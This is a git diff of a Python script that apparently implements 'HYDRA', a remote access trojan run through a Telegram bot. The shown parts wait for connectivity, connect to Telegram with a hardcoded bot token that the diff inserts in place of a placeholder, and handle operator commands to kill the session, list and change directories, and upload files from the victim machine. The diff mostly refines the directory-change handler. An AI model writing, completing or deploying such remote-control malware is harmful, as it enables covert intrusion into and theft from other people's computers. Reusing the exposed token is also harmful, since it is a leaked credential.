@@ -38,7 +38,7 @@ while(is_connected_to_internet()==False):
 # print("WORKING !")
 
 sleep(45)
-TOKEN ='_________________API_TOKEN_________________'   
+TOKEN = '6514752313:AAEH-hiTslW-PHKHTN75-NdUIYL8MhIwfcg'   
 
 bot = telebot.TeleBot(TOKEN)
 cd = os.path.expanduser("~")
@@ -56,7 +56,7 @@ def kill(message):
     try:
 
          bot.send_message(message.chat.id, 'HYDRA Session Killed.')
-         os._exit(0) #terminating 
+         os._exit(0)
 
     except:
         bot.send_message(message.chat.id, 'HYDRA Session unable to terminate.')
@@ -125,19 +125,21 @@ def list_directory(message):
 def change_directory(message):
     try:
         global cd 
-        args = message.text.split(' ')
-        if len(args) >= 2:
-            new_directory = args[1]
-            new_path = os.path.join(cd, new_directory)
+        message_parts = message.text.split(' ')
+        if len(message_parts) >= 2:
+            # Join all parts after the command as the directory name
+            directory_name = ' '.join(message_parts[1:])
+            new_path = os.path.join(cd, directory_name)
             if os.path.exists(new_path) and os.path.isdir(new_path):
                 cd = new_path
-                bot.send_message(message.chat.id, f"you are in : {cd}")
+                bot.send_message(message.chat.id, f"You are in: {cd}")
             else:
-                bot.send_message(message.chat.id, f"The directory does not exist.")
+                bot.send_message(message.chat.id, "The directory does not exist.")
         else:
-            bot.send_message(message.chat.id, "Incorrect command usage. : USE /cd [folder name]")
+            bot.send_message(message.chat.id, "Incorrect command usage: USE /cd [folder name]")
     except Exception as e:
-        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
+        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
+
 
 
 @bot.message_handler(commands=['upload'])
